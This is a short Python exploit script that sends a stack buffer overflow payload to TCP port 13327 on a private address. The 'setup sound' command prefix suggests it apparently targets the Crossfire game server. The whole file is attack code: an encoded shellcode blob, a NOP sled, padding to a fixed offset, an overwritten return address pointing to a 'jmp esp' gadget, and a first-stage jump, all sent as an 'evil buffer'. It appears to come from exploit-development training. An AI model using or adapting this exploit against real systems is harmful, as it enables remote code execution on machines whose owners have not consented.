#!/usr/bin/python
import socket

nop_sled  =  "\x90" * 8 # NOP sled
shellcode =  b""
shellcode += b"\xdb\xca\xba\x47\xb6\x33\xa4\xd9\x74\x24\xf4"
shellcode += b"\x58\x2b\xc9\xb1\x12\x83\xe8\xfc\x31\x50\x13"
shellcode += b"\x03\x17\xa5\xd1\x51\xa6\x12\xe2\x79\x9b\xe7"
shellcode += b"\x5e\x14\x19\x61\x81\x58\x7b\xbc\xc2\x0a\xda"
shellcode += b"\x8e\xfc\xe1\x5c\xa7\x7b\x03\x34\xf8\xd4\x84"
shellcode += b"\x05\x90\x26\x6b\x94\x3d\xae\x8a\x26\xdb\xe0"
shellcode += b"\x1d\x15\x97\x02\x17\x78\x1a\x84\x75\x12\xcb"
shellcode += b"\xaa\x0a\x8a\x7b\x9a\xc3\x28\x15\x6d\xf8\xfe"
shellcode += b"\xb6\xe4\x1e\x4e\x33\x3a\x60"

host = "192.168.193.44"

offset      = "\x41" * (4368 - len(nop_sled) - len(shellcode))
eip         = "\x96\x45\x13\x08" # 08134596 (jmp esp)
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90" # Fills 7 bytes - jumps to EAX+12, and 2 NOPS
buffer      = "\x11(setup sound " + nop_sled + shellcode + offset + eip + first_stage + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Sending evil buffer...")

s.connect((host, 13327))
print(s.recv(1024))

s.send(buffer)
s.close()

print("[*] Payload sent!")